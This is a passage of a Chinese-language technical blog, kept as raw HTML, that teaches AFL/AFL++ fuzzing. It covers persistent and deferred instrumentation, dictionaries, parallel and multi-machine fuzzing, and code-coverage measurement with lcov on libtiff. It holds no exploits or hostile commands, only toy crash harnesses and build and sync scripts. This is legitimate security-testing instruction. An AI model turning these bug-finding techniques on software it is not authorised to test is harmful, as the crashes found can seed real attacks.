class="hljs-keyword">while</span>(__AFL_LOOP(<span class="hljs-number">10000</span>))&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><ul><li>使用编译器选项</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash">AFL_USE_ASAN=1 AFL_LLVM_PERSISTENT_ADDR=main afl-clang-fast -o target target.c</span><br></code></pre></td></tr></table></figure><ul><li><code>AFL_LLVM_PERSISTENT_ADDR=main</code>：指定持久化模式的函数入口点，让 AFL 从<code>main</code>函数开始进行持久化模式插桩。</li></ul><p>Fuzz 一个项目哪些地方需要启动持久模式？</p><h3 id="延迟插桩"><a href="#延迟插桩" class="headerlink" title="延迟插桩"></a>延迟插桩</h3><p><strong>插桩优化</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-comment">/* Main entry point. */</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">/* Example-only buffer, you&#x27;d replace it with other global or</span><br><span class="hljs-comment">                    local variables appropriate for your use case. */</span><br><br>  <span class="hljs-comment">/* The number passed to __AFL_LOOP() controls the maximum number of</span><br><span class="hljs-comment">     iterations before the loop exits and the program is allowed to</span><br><span class="hljs-comment">     terminate normally. This limits the impact of accidental memory leaks</span><br><span class="hljs-comment">     and similar hiccups. */</span><br><br>  <span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">1000</span>)) &#123;<br><br>    <span class="hljs-comment">/*** PLACEHOLDER CODE ***/</span><br><br>    <span class="hljs-comment">/* STEP 1: Fully re-initialize all critical variables. In our example, this</span><br><span class="hljs-comment">               involves zeroing buf[], our input buffer. */</span><br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>);<br><br>    <span class="hljs-comment">/* STEP 2: Read input data. When reading from stdin, no special preparation</span><br><span class="hljs-comment">               is required. When reading from a named file, you need to close</span><br><span class="hljs-comment">               the old descriptor and reopen the file first!</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">               Beware of reading from buffered FILE* objects such as stdin. Use</span><br><span class="hljs-comment">               raw file descriptors or call fopen() / fdopen() in every pass. */</span><br><br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">100</span>);<br><br>    <span class="hljs-comment">/* STEP 3: This is where we&#x27;d call the tested library on the read data.</span><br><span class="hljs-comment">               We just have some trivial inline code that faults on &#x27;foo!&#x27;. */</span><br><br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;f&#x27;</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;one\n&quot;</span>);<br>      <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;o&#x27;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;two\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;o&#x27;</span>) &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;three\n&quot;</span>);<br>          <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;!&#x27;</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;four\n&quot;</span>);<br>            <span class="hljs-built_in">abort</span>();<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/*** END PLACEHOLDER CODE ***/</span><br><br>  &#125;<br><br>  <span class="hljs-comment">/* Once the loop is exited, terminate normally - AFL will restart the process</span><br><span class="hljs-comment">     when this happens, with a clean slate when it comes to allocated memory,</span><br><span class="hljs-comment">     leftover file descriptors, etc. */</span><br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br><span class="hljs-type">ssize_t</span> len;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];<br><br>__AFL_INIT();<br><span class="hljs-keyword">while</span>(__AFL_LOOP(UINT_MAX))&#123;<br><span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-number">100</span>);<br><br>len=read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">100</span>);<br><span class="hljs-keyword">if</span>(len &lt; <span class="hljs-number">8</span>) <span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;f&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;one\n&quot;</span>);<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;o&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;two\n&quot;</span>);<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">2</span>]==<span class="hljs-string">&#x27;o&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;three\n&quot;</span>);<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">3</span>]==<span class="hljs-string">&#x27;!&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;four\n&quot;</span>);<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">4</span>]==<span class="hljs-string">&#x27;!&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;five\n&quot;</span>);<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">5</span>]==<span class="hljs-string">&#x27;!&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;six\n&quot;</span>);<br><span class="hljs-built_in">abort</span>();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>延迟插桩，在程序运行的起点直接启动 forkserver，当 afl 需要创建子进程时就从这里 fork 一个子进程。</p><p>将<code>__AFL_INIT()</code>放在哪里，相当于指定forkserver在哪里生成。比如将其放在无意义源码的下方，这样afl会直接略过无意义的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">__AFL_INIT();<br><span class="hljs-keyword">while</span>(__AFL_LOOP(UNIT_MAX))<br></code></pre></td></tr></table></figure><p>在一次子进程接收多次样本的投喂。</p><p><code>__AFL_LOOP</code>。</p><p><img src="/Linux/assets/Pasted%20image%2020250403122803.png"></p><p>将它抱起来，在外面加一个while循环。让其运行多次，这样就可以接收多次样本投喂。路径覆盖制导，投喂一百次样本如何让程序将覆盖制导信息返回给afl。如何让后面的投喂不受前面的影响。</p><p><img src="/Linux/assets/Pasted%20image%2020250403123046.png"></p><p><code>__AFL_LOOP</code>的使用场景，对网络程序进行fuzz。在fuzz网络程序中我们并不关注socket创建初始化的过程，我们可以通过<code>AFL_INIT</code>略过这部分代码，然后对<code>recv</code>进行fuzz。</p><p>仅插桩你需要的部分</p><p>仅对你现在要压力测试的库进行插桩，一次一个。让程序在任何不需要模糊测试的功能上使用系统范围的、未插桩的库。例如，在大多数情况下，不必因为你正在测试一个依赖于libgmp的大数数学的加密应用程序而对libgmp进行插桩。</p><p>当程序包含一些奇怪的第三方库时（例如，Spidermonkey），请检查<code>./configure</code>选项，使用系统范围的非插桩版本。</p><h3 id="并行"><a href="#并行" class="headerlink" title="并行"></a>并行</h3><p>在 AFL 中如果我们对路径指向有特定要求的程序进行 Fuzz，比如以下这种情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(buf,<span class="hljs-string">&quot;abc&quot;</span>))<br>&#123;...&#125;<br><span class="hljs-keyword">else</span>&#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>输入内容必须为<code>abc</code>才能进入<code>if</code>路径，这种情况下我们 AFL 直接进行 Fuzz 只能通过不断对输入样本进行变异来让输入达到这种要求。但是这样 Fuzz 的效率极低，我们例子中的要求很少，如果要求很大比如几十个字符，那样的话就更难达到变异要求了。</p><p>这时候我们就可以通过字典来加大 Fuzz 效率，如果的字典中有<code>abc</code>，则<code>abc</code>会被插入到样本中。这样就直接满足了要求。AFL++ 项目中就内置了很多字典</p><p>如果我们不指定字典，同样可以通过库函数插桩来进入路径中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">2</span>]==<span class="hljs-string">&#x27;c&#x27;</span>)<br></code></pre></td></tr></table></figure><p>如果想要更高的效率，可以去逆向研究一下要 Fuzz 的程序，将一些可能的固定搭配收集成字典。</p><h4 id="并行化"><a href="#并行化" class="headerlink" title="并行化"></a>并行化</h4><p>现在我们的计算机一般都是多核的 CPU，所以我们可以通过并行化模糊测试充分利用 CPU 的资源。</p><ul><li>独立实例</li></ul><p>这是最简单的并行化策略。在这种模式下，我们运行多个完全独立的 AFL 实例。</p><p>需要记住的是，AFL 使用非确定性的测试算法。因此，如果我们运行多个 AFL 实例，将增加成功的机会。</p><p>你只需要在多个终端窗口中运行多个 “afl-fuzz” 实例，并为每个实例设置不同的 “输出文件夹”。一种简单的方法是根据你系统的核心数运行多个模糊测试任务。</p><p>注意：如果你使用了 <code>-s</code> 参数，需要为每个实例使用不同的种子。</p><ul><li>共享实例</li></ul><p>使用共享实例是更好的并行化模糊测试方法。在这种模式下，每个模糊测试实例会收集其他模糊测试实例发现的测试用例。</p><p>通常情况下，你只有一个主实例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./afl-fuzz -i afl_in -o afl_out -M Master -- ./program @@<br></code></pre></td></tr></table></figure><p>和 N-1 个从实例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">./afl-fuzz -i afl_in -o afl_out -S slave1 -- ./program @@<br>./afl-fuzz -i afl_in -o afl_out -S slave2 -- ./program @@<br>...<br>./afl-fuzz -i afl_in -o afl_out -S slaveN -- ./program @@<br></code></pre></td></tr></table></figure><h4 id="单系统并行化"><a href="#单系统并行化" class="headerlink" title="单系统并行化"></a>单系统并行化</h4><p>如果您希望在本地系统的多个核心上并行化单个作业，只需创建一个新的空输出目录（“同步目录”），并让所有 afl-fuzz 实例共享该目录；然后为每个实例命名，例如“fuzzer01”、“fuzzer02”等。</p><p>启动第一个（“主”实例，-M）如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01 [...其他参数...]<br></code></pre></td></tr></table></figure><p>然后，启动其他（-S）实例如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02 [...其他参数...]<br>$ ./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03 [...其他参数...]<br></code></pre></td></tr></table></figure><p>每个 fuzzer 会将自己的状态保存在不同的子目录中，例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/sync_dir/</span>fuzzer01/<br></code></pre></td></tr></table></figure><p>每个实例也会定期重新扫描顶层同步目录，查看其他模糊测试器是否发现了有趣的测试用例，如果有，它们会将这些用例纳入自己的模糊测试过程中。</p><p>-M 和 -S 模式的区别在于，主实例仍然会执行确定性检查；而其他实例会直接进行随机调整。如果您不希望进行确定性模糊测试，完全可以让所有实例都使用 -S 模式。对于非常慢或复杂的目标，或者在高度并行化的作业中，这通常是个不错的选择。</p><p>注意：运行多个 -M 实例是浪费资源的，虽然目前有实验性支持来并行化确定性检查。若要利用此功能，您需要按如下方式创建 -M 实例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./afl-fuzz -i testcase_dir -o sync_dir -M masterA:1/3 [...其他参数...]<br>$ ./afl-fuzz -i testcase_dir -o sync_dir -M masterB:2/3 [...其他参数...]<br>$ ./afl-fuzz -i testcase_dir -o sync_dir -M masterC:3/3 [...其他参数...]<br></code></pre></td></tr></table></figure><p>其中，冒号后的第一个值是特定主实例的顺序 ID（从 1 开始），第二个值是总共要分配确定性模糊测试的 fuzzers 数量。请注意，如果您启动的 fuzzers 少于第二个数字指定的数量，可能会导致覆盖不足。</p><p>您还可以使用 afl-whatsup 工具从命令行监控作业进度。当实例不再发现新的路径时，可能是停止的时候了。</p><p>警告：在显式指定 -f 选项时要小心。每个 fuzzer 必须使用单独的临时文件；否则可能会发生冲突。一个安全的例子是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./afl-fuzz [...] -S fuzzer10 -f file10.txt ./fuzzed/binary @@<br>$ ./afl-fuzz [...] -S fuzzer11 -f file11.txt ./fuzzed/binary @@<br>$ ./afl-fuzz [...] -S fuzzer12 -f file12.txt ./fuzzed/binary @@<br></code></pre></td></tr></table></figure><p>如果不使用 -f 选项并且让 afl-fuzz 自动生成文件名，通常不会有问题。</p><p><img src="/Linux/assets/Pasted%20image%2020250520134848.png"></p><h4 id="多系统并行化"><a href="#多系统并行化" class="headerlink" title="多系统并行化"></a>多系统并行化</h4><p>多系统并行化的基本操作原理与第 2 节中解释的机制相似。关键区别在于，您需要编写一个简单的脚本，执行以下两个操作：</p><ul><li><p>使用 SSH 和 authorized_keys 连接到每台机器，并获取每个 <fuzzer_id> 本地机器上的 &#x2F;path&#x2F;to&#x2F;sync_dir&#x2F;<fuzzer_id>&#x2F;queue&#x2F; 目录的 tar 归档。最好为每个 fuzzer ID 使用一个包含主机名的命名方案，例如：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> &#123;1..10&#125;; <span class="hljs-keyword">do</span><br>  ssh user@host<span class="hljs-variable">$&#123;s&#125;</span> <span class="hljs-string">&quot;tar -czf - sync/host<span class="hljs-variable">$&#123;s&#125;</span>_fuzzid*/[qf]*&quot;</span> &gt;host<span class="hljs-variable">$&#123;s&#125;</span>.tgz<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure></li><li><p>在所有剩余机器上分发并解压这些文件，例如：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> &#123;1..10&#125;; <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> &#123;1..10&#125;; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;<span class="hljs-variable">$s</span>&quot;</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$d</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">continue</span><br>    ssh user@host<span class="hljs-variable">$&#123;d&#125;</span> <span class="hljs-string">&#x27;tar -kxzf -&#x27;</span> &lt;host<span class="hljs-variable">$&#123;s&#125;</span>.tgz<br>  <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure></li></ul><p>在 experimental&#x2F;distributed_fuzzing&#x2F; 中有一个这样的脚本示例；您还可以找到 Martijn Bogaard 开发的一个更完整的实验工具：</p><p><a href="https://github.com/MartijnB/disfuzz-afl">https://github.com/MartijnB/disfuzz-afl</a></p><p>Richo Healey 提供的另一个客户端-服务器实现是：</p><p><a href="https://github.com/richo/roving">https://github.com/richo/roving</a></p><p>请注意，这些第三方工具不适宜在暴露于互联网或不受信任的用户的系统上运行。</p><p>在开发自定义的测试用例同步代码时，有几个优化点需要注意：</p><ul><li><p>同步不必太频繁；每 30 分钟同步一次通常就可以了。</p></li><li><p>不需要同步 crashes&#x2F; 或 hangs&#x2F; 目录；只需要复制 queue&#x2F;*（最好还包括 fuzzer_stats）。</p></li><li><p>不需要（而且不建议）覆盖现有的文件；tar 中的 -k 选项是避免这一点的好方法。</p></li><li><p>不需要获取那些在某台机器上没有运行的模糊测试器的目录，它们可能只是之前复制到该系统上的。</p></li><li><p>对于大规模的系统群，您将希望合并每台主机的 tar 包，这样就可以通过 n 个 SSH 连接来同步，而不是 n*(n-1)。</p></li><li><p>您还可以实现分阶段同步。例如，可以将系统分为 10 组，第 1 组只向第 2 组推送测试用例，第 2 组只向第 3 组推送，以此类推，最终第 10 组会将测试用例回传给第 1 组。</p></li></ul><p>这种安排将使得有趣的测试用例能够在系统群之间传播，而无需将每个 fuzzer 的队列复制到每一台主机上。</p><ul><li>不要在每台机器上运行一个 “主” 实例；您应当让它们都使用 -S，并仅在某个地方指定一个实例运行 -M。</li></ul><p>不建议跳过同步脚本直接在网络文件系统上运行模糊测试器，因为意外的延迟和无法终止的进程可能会导致 I&#x2F;O 等待状态，进而影响结果。</p><h4 id="远程监控和数据收集"><a href="#远程监控和数据收集" class="headerlink" title="远程监控和数据收集"></a>远程监控和数据收集</h4><p>您可以使用 screen、nohup、tmux 或类似工具来运行远程的 afl-fuzz 实例。如果您将程序的输出重定向到文件，它将自动从复杂的 UI 切换为更简单的状态报告。每个实例的输出目录都会有一个机器可读的基本信息，可以通过 afl-whatsup 工具查看。</p><p>原则上，您可以通过监控主实例（-M）的状态屏幕来查看整体的模糊测试进度，决定何时停止。在这种模式下，最重要的信号就是当长时间没有发现新路径时。如果您没有主实例，只需选择任意一个次要实例进行监控。</p><p>您也可以依赖该实例的输出目录来收集覆盖了整个系统群中所有有意义路径的合成语料库。次要实例（-S）不需要任何特殊监控，只要确保它们处于运行状态即可。</p><p>请注意，崩溃的输入不会自动传播到主实例，因此您可能仍然需要通过同步或健康检查脚本来监控整个系统群的崩溃情况（参见 afl-whatsup）。</p><h2 id="代码覆盖率测量"><a href="#代码覆盖率测量" class="headerlink" title="代码覆盖率测量"></a>代码覆盖率测量</h2><p>代码覆盖率是一种软件指标，表达了每行代码被触发的次数。在进行模糊测试的过程中，我们需要知道我们的 fuzzer 执行的效果怎么样，这个时候就可以使用上代码覆盖率。通过使用代码覆盖率，我们可以了解 fuzzer 已经到达了代码的哪些部分，并可视化 fuzzing 过程。</p><p>IDA 的 Lighouse 插件可以通过读取 Pin 产生的覆盖率日志文件，在 IDA 中以图形化形式展现代码的详细执行路径。</p><p>在 lighthouse 项目的 coverage目录下提供了 Pin 测量代码覆盖率的 Pintool。</p><p>Pin等插桩工具默认使用的日志文件格式为<code>drcov</code>格式，这是一种二进制格式，每个基本块的信息的都是以十六进制数据进行记录。虽然二进制形式的记录方式有利于提高性能，但是人工阅读困难。</p><p>直接进行编译时发生了报错，这里对<code>Code</code>文件做了一些修改：</p><p><strong><code>std::tr1</code>命名空间错误</strong>：- 错误表明代码尝试使用<code>std::tr1::unordered_map</code>和<code>std::tr1::unordered_set</code>，但这些在较新的C++标准中已不再需要</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//using unordered_set = std::tr1::unordered_set&lt;V&gt;;</span><br><span class="hljs-keyword">using</span> unordered_set = std::unordered_set&lt;V&gt;;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> K, <span class="hljs-keyword">typename</span> V&gt;<br><span class="hljs-comment">//using unordered_map = std::tr1::unordered_map&lt;K, V&gt;;</span><br><span class="hljs-keyword">using</span> unordered_map = std::unordered_map&lt;K, V&gt;;<br>&#125;<br></code></pre></td></tr></table></figure><p>获取代码覆盖率日志：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pin -t ./obj-intel64/CodeCoverage.so -- /bin/true<br></code></pre></td></tr></table></figure><p>接下来我们使用 lcov 来展示代码覆盖率工具的使用。</p><p>lcov 是 gcc 测试覆盖率的前段图形展示工具。它通过收集多个源文件的行、函数和分支的代码覆盖信息（程序执行之后生成gcda、gcno文件）并且将收集后的信息生成 HTML 页面。生成 HTML 需要使用 genhtml 命令。</p><ul><li>使用LCOV测量代码覆盖率</li><li>利用覆盖率数据提升模糊测试效率</li></ul><p>代码覆盖率是衡量代码执行情况的指标，能可视化模糊测试过程。</p><p>安装 lcov：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install lcov<br></code></pre></td></tr></table></figure><p>通过代码覆盖率构建项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">make clean<br>  <br>CFLAGS=&quot;--coverage&quot; LDFLAGS=&quot;--coverage&quot; ./configure --prefix=&quot;$HOME/fuzzing_tiff/install/&quot; --disable-shared<br>make<br>make install<br></code></pre></td></tr></table></figure><p>收集覆盖率数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">lcov --zerocounters --directory ./<br>lcov --capture --initial --directory ./ --output-file app.info<br><span class="hljs-meta prompt_">$</span><span class="language-bash">HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w <span class="hljs-variable">$HOME</span>/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff</span><br>lcov --no-checksum --directory ./ --capture --output-file app2.info<br></code></pre></td></tr></table></figure><p>命令说明：</p><ul><li><code>lcov --zerocounters</code>：重置计数器</li><li><code>lcov --capture --initial</code>：生成基线覆盖率文件</li><li>运行目标程序（可多次执行不同输入）</li><li>保存当前覆盖率状态</li></ul><p>生成HTML报告：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">genhtml <span class="hljs-params">--highlight</span> <span class="hljs-params">--legend</span> -output-directory <span class="hljs-string">./html-coverage/</span> <span class="hljs-string">./app2.info</span><br></code></pre></td></tr></table></figure><p>打开<code>./html-coverage/index.html</code>即可查看交互式报告</p><p>覆盖率统计 fuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">CC=afl-gcc CFLAGS=&quot;--coverage&quot; LDFLAGS=&quot;--coverage&quot; ./configure --prefix=&quot;$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/&quot; --disable-shared<br><br><br>AFL_USE_ASAN=1 make -j$(nproc)<br>AFL_USE_ASAN=1 make install<br><br>lcov --zerocounters --directory ./   # 重置计数器<br>lcov --capture --initial --directory ./ --output-file app.info<br><br>afl-fuzz -m none -i $HOME/Desktop/Fuzz/training/fuzzing_libtiff/tiff-4.0.4/test/images/ -o $HOME/Desktop/Fuzz/training/fuzzing_libtiff/out/ -s 123 -- $HOME/Desktop/Fuzz/training/fuzzing_libtiff/install/bin/tiffinfo -D -j -c -r -s -w @@<br><br>lcov --no-checksum --directory ./ --capture --output-file app2.info<br></code></pre></td></tr></table></figure><p>这里面的一个需要注意的点是，lcov是利用的 GCC 的一些功能，所以我们在指定 CC 的时候，需要使用 afl-gcc，而基于 llvm 的 afl-clang-fast&#x2F;afl-clang-lto 都无法成功进行 lcov 的初始化，这也是 lcov 不方便的地方。</p><p>fuzz 的速度会变慢，所以这里可以使用 Master-Slave 模式来加快 fuzz 速度。</p><p>代码覆盖率对于 AFL 这种基于覆盖引导的 fuzzer 来说，意义重大，判定 fuzzer 效果好坏的关键因素之一就是看其代码覆盖率的高低。在对 fuzzer 进行优化和改进时，往往也是朝着可以提升代码覆盖率的方向去更改，毕竟执行越多的代码，越有可能发现更多的问题。</p><h2 id="黑盒Fuzz"><a href="#黑盒Fuzz" class="headerlink" title="黑盒Fuzz"></a>黑盒Fuzz</h2><p>黑盒 fuzz 就是在没有源代码的情况下对已经被编译好的二进制程序进行 fuzz。这样我们就无法编译插桩了，这样我们该怎么 fuzz 这个程序呢？</p><ul><li><p>静态二进制重写</p><ul><li>Trampoline（跳转） - 将基本块的开头指令改成 <code>&#123;call, jmp&#125; XXXX</code>，跳到指定地址 <code>XXXX</code>，该地址中放置用于收集覆盖度的指令，同时还会执行&#x2F;修复原本的程序片段，最后再跳回原始代码。</li><li>代表性的论文&#x2F;方法有：<a 